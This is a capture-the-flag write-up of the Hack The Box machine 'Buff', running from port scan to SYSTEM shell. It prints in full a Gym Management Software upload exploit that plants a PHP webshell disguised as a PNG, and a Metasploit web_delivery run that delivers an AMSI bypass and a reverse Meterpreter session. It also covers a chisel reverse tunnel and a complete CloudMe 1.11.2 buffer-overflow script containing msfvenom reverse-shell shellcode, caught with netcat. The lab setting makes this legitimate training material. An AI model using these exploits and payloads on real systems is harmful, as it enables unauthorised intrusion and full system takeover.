# Buff

## Reconnaissance / Enumeration 

Using NMAP Port full scan
```bash
┌──(justakazh㉿youknowitsme)-[/htb/easy/buff/recon]
└─$ sudo nmap -sS -p- -T5 10.10.10.198 -oN allport
Starting Nmap 7.93 ( https://nmap.org ) at 2023-10-16 05:36 EDT
Stats: 0:00:07 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 60.72% done; ETC: 05:38 (0:00:54 remaining)
Nmap scan report for 10.10.10.198
Host is up (0.035s latency).
Not shown: 65533 filtered tcp ports (no-response)
PORT     STATE SERVICE
7680/tcp open  pando-pub
8080/tcp open  http-proxy

Nmap done: 1 IP address (1 host up) scanned in 111.03 seconds

```

## Initial Access

After recon phases we know that 8080 port are open, and notice in the url `http://10.10.10.198:8080/contact.php` this website using `Gym Management Software 1.0`.
we can use this exploit for getting initial access
https://www.exploit-db.com/raw/48506

```python

import requests, sys, urllib, re
from colorama import Fore, Back, Style
requests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning)

def webshell(SERVER_URL, session):
    try:
        WEB_SHELL = SERVER_URL+'upload/kamehameha.php'
        getdir  = {'telepathy': 'echo %CD%'}
        r2 = session.get(WEB_SHELL, params=getdir, verify=False)
        status = r2.status_code
        if status != 200:
            print Style.BRIGHT+Fore.RED+"[!] "+Fore.RESET+"Could not connect to the webshell."+Style.RESET_ALL
            r2.raise_for_status()
        print(Fore.GREEN+'[+] '+Fore.RESET+'Successfully connected to webshell.')
        cwd = re.findall('[CDEF].*', r2.text)
        cwd = cwd[0]+"> "
        term = Style.BRIGHT+Fore.GREEN+cwd+Fore.RESET
        while True:
            thought = raw_input(term)
            command = {'telepathy': thought}
            r2 = requests.get(WEB_SHELL, params=command, verify=False)
            status = r2.status_code
            if status != 200:
                r2.raise_for_status()
            response2 = r2.text
            print(response2)
    except:
        print("\r\nExiting.")
        sys.exit(-1)

def formatHelp(STRING):
    return Style.BRIGHT+Fore.RED+STRING+Fore.RESET

def header():
    BL   = Style.BRIGHT+Fore.GREEN
    RS   = Style.RESET_ALL
    FR   = Fore.RESET
    SIG  = BL+'            /\\\n'+RS
    SIG += Fore.YELLOW+'/vvvvvvvvvvvv '+BL+'\\'+FR+'--------------------------------------,\n'
    SIG += Fore.YELLOW+'`^^^^^^^^^^^^'+BL+' /'+FR+'============'+Fore.RED+'BOKU'+FR+'====================="\n'
    SIG += BL+'            \/'+RS+'\n'
    return SIG

if __name__ == "__main__":
    print header();
    if len(sys.argv) != 2:
        print formatHelp("(+) Usage:\t python %s <WEBAPP_URL>" % sys.argv[0])
        print formatHelp("(+) Example:\t python %s 'https://10.0.0.3:443/gym/'" % sys.argv[0])
        sys.exit(-1)
    SERVER_URL = sys.argv[1]
    UPLOAD_DIR = 'upload.php?id=kamehameha'
    UPLOAD_URL = SERVER_URL + UPLOAD_DIR
    s = requests.Session()
    s.get(SERVER_URL, verify=False)
    PNG_magicBytes = '\x89\x50\x4e\x47\x0d\x0a\x1a'
    png     = {
                'file': 
                  (
                    'kaio-ken.php.png', 
                    PNG_magicBytes+'\n'+'<?php echo shell_exec($_GET["telepathy"]); ?>', 
                    'image/png', 
                    {'Content-Disposition': 'form-data'}
                  ) 
              }
    fdata   = {'pupload': 'upload'}
    r1 = s.post(url=UPLOAD_URL, files=png, data=fdata, verify=False)
    webshell(SERVER_URL, s)
```

And the result will be like this 

```
┌──(justakazh㉿youknowitsme)-[/htb/easy/buff/exploit]
└─$ python2 gym_management_system.py http://10.10.10.198:8080/
            /\
/vvvvvvvvvvvv \--------------------------------------,                                                                                                                 
`^^^^^^^^^^^^ /============BOKU====================="
            \/

^[[A
^[[[+] Successfully connected to webshell.
C:\xampp\htdocs\gym\upload> 
```

## Meterpreter 

You can set meterpreter after access gained using `exploit/multi/scripts/web_delivery` module,set `targets` to `PSH`, set `payload` to `windows/x64/meterpreter/reverse_tcp`, and set your information lhost,lport, also rsvhost. 
run the module and paste the result will be like this

```
msf6 exploit(multi/script/web_delivery) > 
[*] Started reverse TCP handler on 10.10.14.15:4444 
[*] Using URL: http://10.10.14.15:8080/mVVygiBAzBtT
[*] Server started.
[*] Run the following command on the target machine:
powershell.exe -nop -w hidden -e WwBOAGUAdAAuAFMAZQByAHYAaQBjAGUAUA........
[*] 10.10.10.198     web_delivery - Delivering AMSI Bypass (1389 bytes)
[*] 10.10.10.198     web_delivery - Delivering Payload (3737 bytes)
[*] Sending stage (200774 bytes) to 10.10.10.198
[*] Meterpreter session 1 opened (10.10.14.15:4444 -> 10.10.10.198:49690) at 2023-10-16 05:48:56 -0400

msf6 exploit(multi/script/web_delivery) > sessions

Active sessions
===============

  Id  Name  Type                   Information        Connection
  --  ----  ----                   -----------        ----------
  1         meterpreter x64/windo  BUFF\shaun @ BUFF  10.10.14.15:4444 -> 10.10.
            ws                                        10.198:49690 (10.10.10.198
                                                      )

msf6 exploit(multi/script/web_delivery) > 
```

## Privilege Escalation 
The machine have CloudMe_1112.exe in shaun home. as we know `cloudme` is a Cloud File Server, the version of cloudme that used is 1.11.2.
we can exploit the cloudme 1.11.2 with this exploit below 
[CloudMe 1.11.2 - Buffer Overflow (PoC)](https://www.exploit-db.com/exploits/48389)

we just need to modify the buffer payload using msfvenom
`msfvenom -a x86 -p windows/shell_reverse_tcp LHOST=10.10.14.20 LPORT=443 -b '\x00\x0A\x0D' -f python -v payload`


but hold on! before run the exploit you must know that port 8888 run localy. we need to tunneling first 

### tunnel
we can use https://github.com/jpillora/chisel for tunneling. download and upload chisel.exe to machine using metasploit `upload` command.

first, run this command on your teminal

```
chisel server --reverse --port 9002 --host <myip>
```
now, run this command on machine target

```
chisel.exe client <myip>:9002 R:8888:localhost:8888
```

if successfully connected will be like this

your terminal 
```
┌──(justakazh㉿youknowitsme)-[/htb/easy/buff/exploit
└─$ chisel server --reverse --port 9002 --host 10.10
2023/10/19 09:49:51 server: Reverse tunnelling enabl
2023/10/19 09:49:51 server: Fingerprint zZNJ6KbatKz8Y=
2023/10/19 09:49:51 server: Listening on http://10.1
2023/10/19 09:50:05 server: session#1: Client versioversion (1.8.1-0kali2)
2023/10/19 09:50:05 server: session#1: tun: proxy#R:g
```

machine 
```
:\xampp\htdocs\gym\upload>C:\windows\temp\chisel.exe 88:localhost:8888
C:\windows\temp\chisel.exe client 10.10.14.49:9002 R:8
2023/10/19 14:49:51 client: Connecting to ws://10.10.1
2023/10/19 14:49:53 client: Connected (Latency 180.896
```

to confirm is tunneled, you can run this command
```
netstat -tpln
```
if you found `0.0.0.0:8888` from chisel, it's already tunneled.

let's go back to the payload!
we need to change some additional information such as target variable, and payload. we must change the target to your htb ip.
so, the finnal payload will be like this :


```python
# Exploit Title: CloudMe 1.11.2 - Buffer Overflow (PoC)
# Date: 2020-04-27
# Exploit Author: Andy Bowden
# Vendor Homepage: https://www.cloudme.com/en
# Software Link: https://www.cloudme.com/downloads/CloudMe_1112.exe
# Version: CloudMe 1.11.2
# Tested on: Windows 10 x86

#Instructions:
# Start the CloudMe service and run the script.

import socket

target = "10.10.14.49" #ur htb ip

padding1   = b"\x90" * 1052
EIP        = b"\xB5\x42\xA8\x68" # 0x68A842B5 -> PUSH ESP, RET
NOPS       = b"\x90" * 30


#msfvenom -a x86 -p windows/shell_reverse_tcp LHOST=10.10.14.20 LPORT=443 -b '\x00\x0A\x0D' -f python -v payload
payload =  b""
payload += b"\xda\xcb\xd9\x74\x24\xf4\xbf\xb8\x8d\xb9\x34"
payload += b"\x5b\x33\xc9\xb1\x52\x31\x7b\x17\x03\x7b\x17"
payload += b"\x83\x7b\x89\x5b\xc1\x87\x7a\x19\x2a\x77\x7b"
payload += b"\x7e\xa2\x92\x4a\xbe\xd0\xd7\xfd\x0e\x92\xb5"
payload += b"\xf1\xe5\xf6\x2d\x81\x88\xde\x42\x22\x26\x39"
payload += b"\x6d\xb3\x1b\x79\xec\x37\x66\xae\xce\x06\xa9"
payload += b"\xa3\x0f\x4e\xd4\x4e\x5d\x07\x92\xfd\x71\x2c"
payload += b"\xee\x3d\xfa\x7e\xfe\x45\x1f\x36\x01\x67\x8e"
payload += b"\x4c\x58\xa7\x31\x80\xd0\xee\x29\xc5\xdd\xb9"
payload += b"\xc2\x3d\xa9\x3b\x02\x0c\x52\x97\x6b\xa0\xa1"
payload += b"\xe9\xac\x07\x5a\x9c\xc4\x7b\xe7\xa7\x13\x01"
payload += b"\x33\x2d\x87\xa1\xb0\x95\x63\x53\x14\x43\xe0"
payload += b"\x5f\xd1\x07\xae\x43\xe4\xc4\xc5\x78\x6d\xeb"
payload += b"\x09\x09\x35\xc8\x8d\x51\xed\x71\x94\x3f\x40"
payload += b"\x8d\xc6\x9f\x3d\x2b\x8d\x32\x29\x46\xcc\x5a"
payload += b"\x9e\x6b\xee\x9a\x88\xfc\x9d\xa8\x17\x57\x09"
payload += b"\x81\xd0\x71\xce\xe6\xca\xc6\x40\x19\xf5\x36"
payload += b"\x49\xde\xa1\x66\xe1\xf7\xc9\xec\xf1\xf8\x1f"
payload += b"\xa2\xa1\x56\xf0\x03\x11\x17\xa0\xeb\x7b\x98"
payload += b"\x9f\x0c\x84\x72\x88\xa7\x7f\x15\xbd\x3d\x71"
payload += b"\xd4\xa9\x43\x8d\x17\x91\xcd\x6b\x7d\xf5\x9b"
payload += b"\x24\xea\x6c\x86\xbe\x8b\x71\x1c\xbb\x8c\xfa"
payload += b"\x93\x3c\x42\x0b\xd9\x2e\x33\xfb\x94\x0c\x92"
payload += b"\x04\x03\x38\x78\x96\xc8\xb8\xf7\x8b\x46\xef"
payload += b"\x50\x7d\x9f\x65\x4d\x24\x09\x9b\x8c\xb0\x72"
payload += b"\x1f\x4b\x01\x7c\x9e\x1e\x3d\x5a\xb0\xe6\xbe"
payload += b"\xe6\xe4\xb6\xe8\xb0\x52\x71\x43\x73\x0c\x2b"
payload += b"\x38\xdd\xd8\xaa\x72\xde\x9e\xb2\x5e\xa8\x7e"
payload += b"\x02\x37\xed\x81\xab\xdf\xf9\xfa\xd1\x7f\x05"
payload += b"\xd1\x51\x8f\x4c\x7b\xf3\x18\x09\xee\x41\x45"
payload += b"\xaa\xc5\x86\x70\x29\xef\x76\x87\x31\x9a\x73"
payload += b"\xc3\xf5\x77\x0e\x5c\x90\x77\xbd\x5d\xb1"

overrun    = b"C" * (1500 - len(padding1 + NOPS + EIP + payload))	

buf = padding1 + EIP + NOPS + payload + overrun 

try:
	s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect((target,8888))
	s.send(buf)
except Exception as e:
	print(sys.exc_value)


```

next, run the `nc`
```
nc -lnvp 443
```
after that, run the exploit and and we got the system
```
┌──(justakazh㉿youknowitsme)-[~]
└─$ nc -lnvp 443
listening on [any] 443 ...
connect to [10.10.14.49] from (UNKNOWN) [10.129.25.107] 49821
Microsoft Windows [Version 10.0.17134.1610]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>

```
